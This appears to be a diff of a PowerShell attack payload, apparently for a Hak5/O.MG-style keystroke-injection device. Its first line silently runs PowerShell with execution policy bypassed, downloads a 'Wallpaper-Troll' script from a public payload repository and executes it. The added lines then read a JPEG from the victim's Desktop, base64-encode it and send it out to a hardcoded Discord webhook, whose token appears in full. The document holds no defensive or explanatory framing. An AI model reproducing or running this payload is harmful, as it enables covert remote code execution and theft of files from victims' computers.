@@ -1,1 +1,19 @@
 powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1; invoke-expression $pl
+
+$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop), "kaas.jpg")
+$webhookUrl = "https://discord.com/api/webhooks/1051825689227165806/KeD-xcnMKq6uC9DkmGciCrbGoTGpXcyxtn2aM06Kse3P8aTlY9vkofgpLftwuRdHD6CZ"
+
+$fileContent = Get-Content -Path $desktopPath -Encoding Byte
+$fileData = [Convert]::ToBase64String($fileContent)
+$fileType = "image/jpeg"
+$fileName = "kaas.jpg"
+
+$body = @{
+    file = @{
+        value = $fileData
+        type = $fileType
+        name = $fileName
+    }
+} | ConvertTo-Json
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
